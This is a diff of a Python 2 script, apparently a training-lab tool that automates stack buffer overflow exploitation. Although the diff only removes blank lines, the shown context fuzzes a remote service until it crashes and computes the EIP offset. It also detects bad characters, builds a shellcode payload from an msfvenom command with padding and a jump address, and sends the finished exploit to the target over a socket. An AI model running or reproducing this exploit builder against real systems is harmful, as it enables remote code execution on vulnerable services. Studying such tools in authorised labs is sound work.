@@ -6,12 +6,10 @@ import re
 import struct
 from argparse import ArgumentParser
 
-
 # If your remote server may take more than seven seconds to respond, increase this value.
 TIMEOUT = 7.0
 INCREMENT = 200  # This is how many bytes the fuzzer steps each iteration
 ITERATIONS = 30  # This is how many iterations we perform total. Adjust these two variables to alter the precision/scale
-
 
 host = None
 port = None
@@ -20,7 +18,6 @@ outputFile = None
 help = False
 prefix = ""
 suffix = ""
-
 
 parser = ArgumentParser()
 parser.add_argument("-o", "--output", default=False,
@@ -35,7 +32,6 @@ parser.add_argument(
     "host", help="The host executing the vulnerable application (usually your debugger)")
 parser.add_argument(
     "port", type=int, help="The port the application is running on")
-
 
 arguments = vars(parser.parse_args())
 outputFile = arguments["output"]
@@ -53,9 +49,7 @@ suffix = suffix.replace('\\n', '\n').replace('\\t', '\t').replace('\\r', '\r').r
 
 bytesToOverflow = 0  # Saves how many bytes crashed the service
 
-
 # Create an array of buffers, from 1 to 5900, with increments of 200
-
 buffer = ["A"]
 counter = 100
 while len(buffer) <= ITERATIONS:
@@ -97,7 +91,6 @@ while True:  # We'll try again if we can't connect
     s.close()
     break
 
-
 print("Service crashed. Please enter the value shown in the EIP exactly as it appears (Big Endian)")
 eip = raw_input("EIP: ")
 eip = eip.replace("\\x", "")
@@ -113,7 +106,6 @@ if prefix:
 else:
     print("(*) Exact match at offset " + str(offset))
 
-
 if debug:
     badCharList = []
     print("(-) Beginning bad character detection.")
@@ -123,7 +115,6 @@ if debug:
         badCharList.append(bytes(chr(i)))
     raw_input()
     if debug:  # TO DO: Remove this line and fix indentation
-
         foundChars = []  # List of characters that are bad
         print("(-) Assuming \\x00, \\x0a, and \\x0d are bad characters")
         badCharList.remove("\x00")
@@ -214,7 +205,6 @@ if debug:
                 "\nPlease restart the vulnerable service and your debugger. Press enter to continue")
             raw_input()
 
-
 print("Please enter the full command of the msf payload you would like to generate")
 payload = raw_input("Command: ")
 print("(-) Generating payload")
@@ -264,14 +254,12 @@ if not insertBefore:
 else:
     exploit = prefix + buf + "A"*(offset - len(buf)) + jump[::-1] + suffix
 
-
 evil.replace("0x", "\\x")
 if len(evil) == 8:  # If we need to insert backslashes for our output
     evil = "\\x" + '\\x'.join(evil[i:i+2] for i in range(0, len(evil), 2))
 
 evil = "".join(reversed([evil[i:i+4]
                for i in range(0, len(evil), 4)]))  # Little Endian
-
 
 if outputFile:
     print("(-) Generating output file (modify and run exploit from that file to debug)")
@@ -291,7 +279,6 @@ if outputFile:
     file.write(malware)
     file.close()
 
-
 print("Exploit ready. Launch? (y/n)")
 while True:
     answer = raw_input(">> ").lower()
@@ -308,6 +295,5 @@ else:
     s.send(exploit)
     s.close()
     print("(*) Exploit Sent!")
-
 
 print("(*) Script Complete.")
